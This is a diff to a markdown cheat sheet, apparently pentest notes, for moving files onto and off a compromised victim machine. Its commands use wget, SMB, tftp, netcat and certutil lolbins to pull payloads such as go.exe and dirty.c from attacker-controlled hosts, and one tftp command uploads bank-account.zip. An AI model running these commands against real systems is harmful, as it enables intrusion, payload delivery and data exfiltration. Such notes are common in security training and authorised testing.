@@ -6,6 +6,7 @@ on the victim (e.g., webshell)
 ```
 sudo service apache2 start
 /var/www/html
+
 wget http://192.168.1.42/go.exe
 ```
 
@@ -29,6 +30,7 @@ tftp -i 10.11.0.185 PUT bank-account.zip incoming
 #### SMB
 ```
 smbserver.py [sharename] /tmp/smbserve/
+
 Dir \\192.168.1.48\sharename
 \\192.168.1.48\sharename\go.exe
 ```
@@ -53,10 +55,9 @@ Dir \\192.168.1.48\sharename
 #### SimpleHTTPServer
 ```python -m SimpleHTTPServer```
 
-#### FTP
 
 
-# Linux
+# File Transfer - Linux
 ```wget http://10.11.0.158/dirty.c -O /tmp/dirty.c```
 
 ```scp root@10.11.0.158:~/Downloads/dirty.c .```
@@ -75,7 +76,7 @@ nc <RHOST> <RPORT> > <FILE>
 
 
 
-# Windows lolbins
+# More -  Windows lolbins
 [BitsAdmin ](https://lolbas-project.github.io/lolbas/Binaries/Bitsadmin/)
 
 ```certutil -urlcache -split -f "http://<LHOST>/<FILE>" <FILE>```
